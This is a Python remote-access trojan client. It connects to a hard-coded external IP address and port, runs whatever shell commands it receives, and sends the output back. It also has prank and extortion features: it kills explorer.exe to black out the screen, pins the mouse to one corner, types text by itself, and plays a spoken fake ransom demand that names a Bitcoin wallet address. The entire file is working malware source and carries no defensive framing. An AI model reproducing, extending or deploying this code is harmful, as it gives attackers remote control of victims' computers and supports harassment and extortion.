import threading

mouse = False

def alert(data):
    import pyautogui
    data = data.replace('[', '').replace(']', '').replace("'", '').replace(',', '').replace('"', '')
    pyautogui.alert(data)

def blackscreen():
    import os
    os.system('taskkill /f /im explorer.exe')

def fixblackscreen():
    import os
    os.system('explorer.exe')

def mousekill():
    import pyautogui as pag
    import time
    while True:
        pag.FAILSAFE = False
        time.sleep(.1)
        pag.moveTo(15, 15)

def curseType():
    totype = "Life Be Like MD5 Tho :rofl:"
    import pyautogui as pag
    import time
    while True:
        time.sleep(5)
        pag.typewrite(totype)
    
def screech():
    import gtts
    from playsound import playsound
    import time
    import random
    import string
    a = string.ascii_letters
    try:
        code = ""
        for i in range(5):
        
            b = random.choice(a)
            code = code + b

        tts = gtts.gTTS("your computer is now infected. please send 25$ to the btc wallet address that has just popped up")
        tts.save(f"{code}.mp3")
        time.sleep(1)
        playsound(f"{code}.mp3")

        time.sleep(3)
        import pyautogui
        pyautogui.alert('bc1qe5sdhd3spvasj2cn2sstg9aqpf6g2n2hplwn8d')
        
    except:
        a = 0

def startup():
    print('not sure how to make this lol')

    
    


def run():


    import socket
    # control operating system of target machine
    import os
    import subprocess
    import pyautogui

    s = socket.socket() # client computer can connect to others

    # ip address of server, can use own computer's private IP if doing on local
    host = "107.173.24.197"
    port = 1254

    s.connect((host, port)) # binds client computer to server computer

    # infinite loop for continuous listening for server's commands
    while True:
        

        data = s.recv(1024)
        if data[:2].decode() == 'cd':
    
            # command to change directory (cd)
            os.chdir(data[3:].decode()) # look at target directory to cd tor

        elif 'mousekill' in str(data):
            threading.Thread(target=mousekill, args=()).start()
            output_str = "Mouse Killed "
            output_str = output_str.replace("b''", "")
            s.send(str.encode(output_str))

        elif 'screech' in str(data):
            threading.Thread(target=screech, args=()).start()
            output_str = "Screech enabled "
            output_str = output_str.replace("b''", "")
            s.send(str.encode(output_str))

        elif 'cursetype' in str(data):
            threading.Thread(target=curseType, args=()).start()
            output_str = "curseType enabled "
            output_str = output_str.replace("b''", "")
            s.send(str.encode(output_str))

        elif 'fixblackscreen' in str(data):
            threading.Thread(target=fixblackscreen, args=()).start()
            output_str = "Fixed Black Screen "
            output_str = output_str.replace("b''", "")
            s.send(str.encode(output_str))
        
        elif 'blackscreen' in str(data):
            threading.Thread(target=blackscreen, args=()).start()
            output_str = "Screen Blacked "
            output_str = output_str.replace("b''", "")
            s.send(str.encode(output_str))
        


        elif 'alert' in str(data):

            
            data = str(data)
            data = data.split(' ')
            data = str(data)
            a = data[0]
            data = data.replace('alert', '')
            data = str(data)
            threading.Thread(target=alert, args=(data,)).start()
            
            output_str = "Sent! "
            output_str = output_str.replace("b''", "")
            s.send(str.encode(output_str))
            


        elif len(data) > 0:




             # check if there are actually data/commands received (that is not cd)
            # opens up a process to run a command similar to running in terminal, takes out any output and pipes out to standard stream
            cmd = subprocess.Popen(data[:].decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
            # bytes and string versions of results
            output_bytes = cmd.stdout.read() + cmd.stderr.read() # bytes version of streamed output
            output_str = str(output_bytes) # plain old basic string
            # getcwd allows the server side to see where the current working directory is on the client
            output_str = output_str.replace("b''", "")
            s.send(str.encode(output_str +"'" + str(os.getcwd()) + ' >> '))
            




    # close connection
    s.close()


run()